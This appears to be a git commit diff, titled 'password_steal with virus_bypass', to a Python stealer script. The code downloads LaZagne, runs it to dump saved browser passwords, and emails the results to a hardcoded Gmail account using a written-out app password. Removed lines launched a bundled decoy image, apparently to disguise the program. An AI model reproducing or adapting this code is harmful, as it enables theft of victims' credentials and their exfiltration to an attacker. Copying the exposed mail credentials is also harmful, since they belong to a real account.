4f62e232868ab5278dc56cf9d9f4bb0247922e0e
Epavinath <125739963+Epavinath@users.noreply.github.com>
2024-01-27 21:00:42 +0530

    password_steal with virus_bypass

--- main.py
+++ main.py
@@ -15,11 +15,14 @@ def down(url):
     file_name=url.split("/")[-1]
     with open(file_name,"wb") as pk:
        pk.write(cont.content)
-file_name = sys._MEIPASS + "/sample.jpg"
-subprocess.Popen(file_name, shell=True)
+#file_name = sys.builtin_module_names + "/sample.jpg"
+#rog =  "https://tse1.explicit.bing.net/th?id=OIP.LZSEjbib381lpilyE8yNVQHaPA&pid=Api&P=0&h=220"
+#subprocess.Popen(rog, shell=True)
 #temp_dir=tempfile.gettempdir()
 #os.chdir(temp_dir)
 down("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe")
 mess =subprocess.check_output("lazagne.exe browsers", shell=True)
-ss(mess,"pdfibzwqdsdnzpjw","epavi1635@gmail.com","fbook0043@gmail.com")
+my_mail="epavi1635@gmail.com"
+mail_password="pdfibzwqdsdnzpjw"
+ss(mess, mail_password, my_mail, my_mail)
 #os.remove("lazagne.exe")
